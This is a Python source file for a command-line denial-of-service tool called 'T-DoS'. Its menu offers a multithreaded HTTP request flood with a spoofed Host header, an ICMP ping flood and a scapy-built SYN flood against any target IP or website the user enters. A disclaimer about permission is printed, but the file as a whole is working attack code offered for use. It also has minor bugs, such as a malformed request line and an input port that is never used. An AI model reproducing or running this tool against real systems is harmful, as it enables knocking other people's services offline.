import os
from concurrent.futures import thread
import socket
import threading
import time
from scapy import *
from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
print("Use this tool only on your own website or websites from which you have obtained permission.")
time.sleep(5)
os.system("clear")
os.system("toilet T-DoS")
print("Coded By: ParzivalHack")
print("Github: https://github.com/ParzivalHack")
print("License: The source code of this tool is under the MIT License.")
print("＞＞＞＞>>>＞[Menu]＜<<<＜＜＜＜")
print("1) DDoS Attack)")
print("2) Ping Flood Attack")
print("3) SYN Flood Attack")
fake_ip = '44.197.175.168'
attack_num = 0
options = int(input("Select Option: "))

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

def send_syn(target_ip: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * size_of_packet)
    p = ip / tcp / raw
    send(p, count=number_of_packets_to_send, verbose=0)
    print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip + ' on port ' + str(target_port))


def send_ping(target_ip2: str, number_of_packets_to_send2: int = 4, size_of_packet2: int = 65000):
    ip = IP(dst=target_ip2)
    icmp = ICMP()
    size_of_packet2 = 1024
    raw = Raw(b"X" * size_of_packet2)
    p = ip / icmp / raw
    send(p, count=number_of_packets_to_send2, verbose=0)
    print('send_ping(): Sent ' + str(number_of_packets_to_send2) + ' pings of ' + str(size_of_packet2) + ' size to ' + target_ip2)

if options == 1:
    target = str(input("Insert Target IP or Website: "))
    port = int(input("Insert Target Port: "))
    Trd = int(input("Insert Threads: "))
    for i in range(Trd):
            thread = threading.Thread(target = attack)
            thread.start()

elif options == 2:
    target_ip = str(input("Insert Target IP or Website: "))
    target_port = int(input("Insert Target Port (443 suggested): "))
    number_of_packets_to_send2 = int(input("Insert Number of Packets to send: ")) 
    send_ping(target_ip, number_of_packets_to_send2)

elif options == 3:
    target_ip2 = str(input("Insert Target IP or Website: "))
    port = int(input("Insert Target Port (443 suggested): "))
    number_of_packets_to_send = int(input("Insert Number of Packets to send: "))
    send_syn(target_ip2, port, number_of_packets_to_send)
